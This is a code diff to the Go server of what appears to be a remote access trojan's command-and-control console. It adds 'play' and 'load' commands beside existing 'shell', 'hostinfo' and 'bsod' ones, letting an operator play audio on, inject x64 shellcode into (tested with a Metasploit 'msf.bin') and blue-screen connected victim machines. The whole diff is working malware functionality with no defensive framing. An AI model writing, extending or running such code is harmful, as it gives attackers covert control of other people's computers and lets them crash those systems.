@@ -6,6 +6,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"regexp"
 	"strings"
 	"time"
 )
@@ -116,14 +117,26 @@ func openSession(id int, sl *SessionList) {
 		if err != nil {
 			fmt.Println("Error reading input:", err)
 			continue
-		}
+		} //Check how to make this prettier
 		command = strings.TrimSpace(command)
+		playRegex := regexp.MustCompile(`play .+`)
+		playMatch := playRegex.FindString(command)
+		loadRegex := regexp.MustCompile(`load .+`)
+		loadMatch := loadRegex.FindString(command)
+		if playMatch != "" {
+			audioFile := strings.Split(command, " ")[1]
+			playAudio(&current.Conn, audioFile)
+		}
+		if loadMatch != "" {
+			binFile := strings.Split(command, " ")[1]
+			load(&current.Conn, binFile)
+		}
 		switch command { //All of the func below will be found under bushido.go
 		case "shell":
 			shell(&current.Conn)
 		case "hostinfo":
 			hostinfo(&current.Conn)
-		case "bsod": //FIX THIS. IT THROWS THE SERVER OUT OF SYNC WITH THE CLIENT. Fix it ClientSide a7la
+		case "bsod": //Refine it a bit more
 			if bsod(&current.Conn) {
 				fmt.Println("HOST BSOD !")
 				fmt.Println("Impliment Feature where the host is removed from the list when this happens")
@@ -135,6 +148,12 @@ func openSession(id int, sl *SessionList) {
 			return
 		case "exit":
 			return
+		case "play": //The audio thing only works if the device is not a VM
+			fmt.Println("Usage: play <fileNameInAudio>")
+			//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
+		case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
+			fmt.Println("Usage: play <x64ShellcodeFile>")
+			//load(&current.Conn, "msf.bin") //Test Case. Success
 		default:
 			fmt.Println("\nUsage: shell, hostinfo, bsod, bg\n")
 		}
